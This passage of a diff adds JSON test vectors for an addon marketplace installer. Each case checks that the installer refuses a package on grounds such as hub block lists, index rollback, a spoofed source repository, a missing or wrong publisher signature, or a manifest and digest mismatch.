+       "https://github.com/other/market"
+      ],
+      "block": [],
+      "ceiling": null
+     },
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.not_allowed"
+   },
+   "name": "install_hub_not_allowed"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": {
+      "allow": [],
+      "block": [],
+      "ceiling": null
+     },
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.not_allowed"
+   },
+   "name": "install_hub_empty_allow_list"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": {
+      "allow": [
+       "https://github.com/acme/orch-market"
+      ],
+      "block": [
+       "https://github.com/acme/orch-market"
+      ],
+      "ceiling": null
+     },
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.blocked"
+   },
+   "name": "install_hub_block_beats_allow"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": {
+      "allow": [
+       "https://github.com/acme/orch-market"
+      ],
+      "block": [],
+      "ceiling": null
+     },
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/severinlindenmann/orch-marketplace",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"git_push\", \"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"github\", \"schema\": \"orch.addon/3\", \"title\": \"Github\", \"version\": \"1.0.0\"}"
+    },
+    "id": "github",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "git_push",
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "github",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:5f0c958d357a741a15bbfb9af573ac2152e5b8d60c0a1b44f16d84ed82d53699",
+       "publisher": {
+        "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+        "sig": "CGMU9z8P4R0aLYLZWBKMOk8tTFX8ebgpzRoca19GRrl_sImxBagoF-FTGarjEK5yxKjuGXhM0UugXDQQOY8ufQ"
+       },
+       "source": {
+        "git": "https://github.com/acme/github",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "orch-marketplace",
+     "source": {
+      "git": "https://github.com/severinlindenmann/orch-marketplace"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.not_allowed"
+   },
+   "name": "install_hub_blocks_official_not_listed"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": 8,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.rollback"
+   },
+   "name": "install_index_rollback"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/evil/copy-of-acme",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.source_mismatch"
+   },
+   "name": "install_source_mismatch"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "nope",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.unknown_addon"
+   },
+   "name": "install_unknown_addon"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"wiki\", \"schema\": \"orch.addon/3\", \"title\": \"Wiki\", \"version\": \"1.0.0\"}"
+    },
+    "id": "wiki",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "wiki",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:8ee807e1eee47590ddf384dff75de65c1a01a6da1fc5dbf17a399c425d178c18",
+       "source": {
+        "git": "https://github.com/acme/wiki",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.reserved_id"
+   },
+   "name": "install_reserved_builtin_id"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {
+      "standup": {
+       "origin": "https://github.com/someone/else",
+       "version": "0.9.0"
+      }
+     },
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.origin_changed"
+   },
+   "name": "install_origin_changed"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/severinlindenmann/orch-marketplace",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"git_push\", \"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"github\", \"schema\": \"orch.addon/3\", \"title\": \"Github\", \"version\": \"1.0.0\"}"
+    },
+    "id": "github",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "git_push",
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "github",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:5f0c958d357a741a15bbfb9af573ac2152e5b8d60c0a1b44f16d84ed82d53699",
+       "source": {
+        "git": "https://github.com/acme/github",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "orch-marketplace",
+     "source": {
+      "git": "https://github.com/severinlindenmann/orch-marketplace"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.official_unsigned"
+   },
+   "name": "install_official_entry_unsigned"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/severinlindenmann/orch-marketplace",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"git_push\", \"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"github\", \"schema\": \"orch.addon/3\", \"title\": \"Github\", \"version\": \"1.0.0\"}"
+    },
+    "id": "github",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "git_push",
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "github",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:5f0c958d357a741a15bbfb9af573ac2152e5b8d60c0a1b44f16d84ed82d53699",
+       "publisher": {
+        "key": "BMlyPZZElYwTNIMMA1ZFxa58Mathf1eNt_ZfmZdjNjESVgGHwHHgu2mwkMNzREBDL8i859JRPVLmCCwe0w8TnzE",
+        "sig": "ConzAb_yn8rka4oAN3LGzz4DumIdFgU1cEIsBdsmV7fPNcBDGD9r0rxcXvXJHARk2QH-G_6tTwkfWTTXuZk_7A"
+       },
+       "source": {
+        "git": "https://github.com/acme/github",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "orch-marketplace",
+     "source": {
+      "git": "https://github.com/severinlindenmann/orch-marketplace"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.official_unsigned"
+   },
+   "name": "install_official_entry_wrong_key"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"other-name\", \"schema\": \"orch.addon/3\", \"title\": \"Other-Name\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.digest_mismatch"
+   },
+   "name": "install_another_package_for_the_entry"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"other-name\", \"schema\": \"orch.addon/3\", \"title\": \"Other-Name\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:bf6598df65b0bcde84c33454ec963b1e73c146f57a2b14863fb238bfe848e2b1",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.manifest_mismatch"
+   },
+   "name": "install_manifest_name_differs"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\", \"pty\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:6c5e1254fe6bef416506e90bf355d8c3b904df280e3294fe41184db6560bb976",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.manifest_mismatch"
+   },
+   "name": "install_manifest_more_capabilities"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.1\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:efa464065fbca826eab6a9fe57584ed676d0ae41dab1726fed6f4966af8cd7e2",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.manifest_mismatch"
+   },
+   "name": "install_manifest_version_differs"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"1.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:eaf42c59351e381f657e928f6a5d92c30ce71e43c640cec60c1229a7beed07a5",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.manifest_mismatch"
+   },
+   "name": "install_manifest_min_core_differs"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/2\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:564077c5ae3c2dd304c9ba4a124eb3a2b683f9bcb2075a8080fa73779fb28ff6",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.manifest_mismatch"
+   },
+   "name": "install_manifest_schema_2"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
